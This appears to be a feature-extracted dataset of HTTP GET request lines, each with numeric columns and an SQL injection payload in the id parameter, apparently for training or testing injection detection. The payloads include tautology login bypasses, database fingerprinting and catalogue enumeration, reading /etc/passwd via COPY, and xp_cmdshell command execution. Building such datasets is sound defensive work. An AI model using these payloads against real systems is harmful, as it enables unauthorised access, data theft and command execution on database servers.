34,1,200,2586,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
34,1,200,1205,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
34,1,200,6388,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
43,1,200,2902,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,3912,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,7187,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,6887,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,7398,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,2269,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,5626,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,6988,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,2742,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
55,1,200,2386,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,7357,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,6064,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3213,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,7755,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,5076,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,5923,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
43,1,200,4890,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,2457,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,1212,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
67,1,200,1718,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
67,1,200,2906,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
32,1,200,7634,7,5,7,1,1,GET ?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
32,1,200,7679,7,5,7,1,1,GET ?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
32,1,200,2351,7,5,7,1,1,GET ?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
24,1,200,1756,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
24,1,200,1905,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
61,1,200,3416,7,31,10,2,1,GET ?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
38,1,200,4353,7,11,9,2,1,GET login/?id='or 1=1 or ''=' HTTP/1.1
38,1,200,5395,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,2248,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,5221,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
32,1,200,4882,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
32,1,200,2529,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
34,1,200,4661,7,9,8,2,1,GET login/?id=' or '1'='1 HTTP/1.1
34,1,200,2887,7,9,8,2,1,GET login/?id=' or '1'='1 HTTP/1.1
34,1,200,6070,7,9,8,2,1,GET login/?id=' or '1'='1 HTTP/1.1
35,1,200,2779,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,6149,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
62,1,200,1241,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,5821,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,1483,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,2594,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,2570,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,4077,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,2428,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
81,1,200,7515,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,5229,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,6089,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,1212,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,1569,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,6931,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,3745,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
33,1,200,4243,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,7736,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,4252,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,4363,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
27,1,200,7858,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
27,1,200,7500,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
27,1,200,1414,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
69,1,200,6929,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2033,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,1805,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2607,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2476,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,6044,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,1357,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
54,1,200,4326,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4250,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4334,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,7044,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5461,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4815,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5300,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,3395,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5169,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5801,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6667,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4695,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
64,1,200,2530,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,5009,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,3288,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,4443,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,5035,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
32,1,200,5396,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
32,1,200,4741,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
32,1,200,1045,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
32,1,200,7294,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
32,1,200,6337,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
33,1,200,4189,7,9,5,2,1,GET login/?id=' or 1=1 ¡V HTTP/1.1
33,1,200,6983,7,9,5,2,1,GET login/?id=' or 1=1 ¡V HTTP/1.1
33,1,200,2114,7,9,5,2,1,GET login/?id=' or 1=1 ¡V HTTP/1.1
32,1,200,2965,7,4,12,1,1,GET ?id=') or '1'='1'-- HTTP/1.1
32,1,200,4920,7,4,12,1,1,GET ?id=') or '1'='1'-- HTTP/1.1
26,1,200,1536,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
26,1,200,3932,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
26,1,200,6699,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
39,1,200,3046,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
39,1,200,2318,7,9,12,3,1,GET login/?id=') or ('1'='1'/* HTTP/1.1
37,1,200,2530,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3417,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,2280,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,4033,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,5485,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3925,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3342,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,2312,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,1557,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3450,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
51,1,200,3036,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,3725,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,6689,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,3026,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,3763,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,1092,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,5643,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,4149,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,7630,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,6206,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
58,1,200,7158,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,3173,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,7872,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,3590,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,7392,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,7232,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,5013,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,1896,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,6721,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,1093,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,7443,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,6964,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,5958,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,3626,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
45,1,200,1724,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,1317,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,1308,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,2229,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,4756,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,3303,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,4627,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,1241,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
55,1,200,3062,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
55,1,200,2556,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
33,1,200,2995,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,6084,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,2424,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,2850,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,7316,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,3064,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,2599,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,5307,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,6302,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,7066,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
56,1,200,2221,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,5298,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,2435,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,2952,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,4713,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
56,1,200,5246,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
48,1,200,4858,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4777,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1302,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1031,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6629,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2475,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4083,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6069,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4653,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1082,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2416,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1537,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3229,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3125,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6690,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5363,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2189,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1249,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7728,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3138,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
55,1,200,2901,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,4248,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6465,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6748,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,4853,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1380,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1973,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,7776,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,1303,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
58,1,200,5391,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,2496,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,7179,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,2915,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,3269,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,4519,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
28,1,200,4466,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
28,1,200,3330,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
28,1,200,1796,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
36,1,200,6315,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
36,1,200,1890,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
57,1,200,2361,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,1448,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,6982,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,5422,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,7394,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,2792,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,2403,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
57,1,200,4365,7,34,8,1,1,GET ?id=select current_setting('log_statement'); HTTP/1.1
58,1,200,2031,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,6059,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,2402,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
